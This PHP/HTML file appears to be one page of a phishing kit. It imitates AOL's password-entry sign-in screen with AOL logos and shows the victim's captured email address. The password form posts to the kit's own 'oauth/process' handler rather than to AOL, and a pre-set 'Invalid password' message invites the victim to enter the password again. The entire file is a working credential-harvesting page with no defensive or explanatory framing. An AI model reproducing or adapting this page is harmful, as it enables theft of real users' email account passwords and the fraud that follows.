<?php
defined("ALLOW") or exit('No direct script access allowed');

?>
<!DOCTYPE html>
<html lang="en">

<head>
    <title>Amazon: AOL account</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <link rel="shortcut icon" href="<?= base_url() ?>CR51/Assets/email/img/aol-favicon.png">
    <link rel="stylesheet" href="<?= base_url() ?>CR51/Assets/email/css/boostrap.min.css">
    <link rel="stylesheet" href="<?= base_url() ?>CR51/Assets/email/css/main.css">
    <style>
        body {
            font-family: Helvetica Neue, Helvetica, Arial
        }

        .navbar-brand {
            margin-top: 10px;
            margin-left: 35px
        }

        .nav-link {
            font-size: 13px;
            margin-right: 35px
        }

        .nav-link>a {
            color: #39f
        }

        .col-lg-3 {
            margin-top: 20px;
            margin-right: 240px
        }

        .card {
            width: 360px;
            box-shadow: 0 2px 4px 0 rgba(0, 0, 0, .3)
        }

        .card-body {
            padding: 0
        }

        .card-body>img {
            padding-top: 28px
        }

        .card-body>p {
            color: #26282a;
            font-weight: 400;
            font-size: .95353rem
        }

        .card-body>.text-title {
            font-size: 1.27647rem;
            font-weight: 600
        }

        form {
            padding: 30px;
            margin-top: 20px
        }

        label {
            font-size: .80588rem;
            color: #262626
        }

        .form-control {
            padding: 0;
            border-top-width: 0;
            border-left-width: 0;
            border-right-width: 0;
            -webkit-border-radius: 0
        }

        .form-control:focus {
            box-shadow: none;
            background-color: transparent
        }

        .btn {
            background: #39f;
            border: 1px solid #39f
        }

        .btn:focus {
            background: #1476d9;
            border-color: #1476d9;
            box-shadow: none;
            outline: 0
        }

        .forgot {
            font-size: .82353rem;
            margin-top: 130px
        }

        .forgot>a {
            color: #39f;
            background: 0 0;
            border-color: transparent
        }

        @media screen and (max-width:768px) {
            .navbar {
                display: none
            }

            .col-lg-3 {
                margin-top: 5px;
                margin-right: 5px
            }

            .card {
                border: none;
                box-shadow: none
            }

            form {
                padding: 20px
            }

            .forgot {
                font-size: .82353rem;
                margin-top: 380px
            }
        }
    </style>
</head>

<body>
    <nav class="navbar navbar-expand-sm"><a class="navbar-brand" href="#"><img src="<?= base_url() ?>CR51/Assets/email/img/aol-logo-black-v.0.0.2.png" alt="Logo" width="100"></a>
        <ul class="navbar-nav ml-auto">
            <li class="nav-item active"><a class="nav-link" href="#">Help</a></li>
        </ul>
    </nav>
    <div class="container-fluid">
        <div class="row d-flex align-items-end justify-content-end">
            <div class="col-lg-3 col-md-3 col-sm-12">
                <div class="card">
                    <div class="card-body text-center"><img src="<?= base_url() ?>CR51/Assets/email/img/aol-logo-black-v.0.0.2.png" alt="Logo" width="100">
                        <p class="mt-3"><?= $_SESSION['emailLogin'] ?></p><label></label>
                        <p class="text-title mb-0">Enter password</p>
                        <p class="mt-0">to finish sign in</p>
                        <form method="post" action="<?= base_url() ?>oauth/process" class="text-left">
                            <div class="form-group"><input type="password" class="form-control" placeholder="Password" id="password2" name="password" required>
                                <p class="error-msg" role="alert" data-error="messages.ERROR_EMPTY_PASSWORD">Invalid password. Please try again</p>
                            </div><button type="submit" class="btn btn-primary btn-block" name="submit">Next</button>
                            <div class="forgot-cont challenge-button-link"><input class="pure-button puree-button-link challenge-button-link" value="Forgot&nbsp;password?"></div>
                        </form>
                    </div>
                </div>
            </div>
        </div>
    </div>
</body>

</html>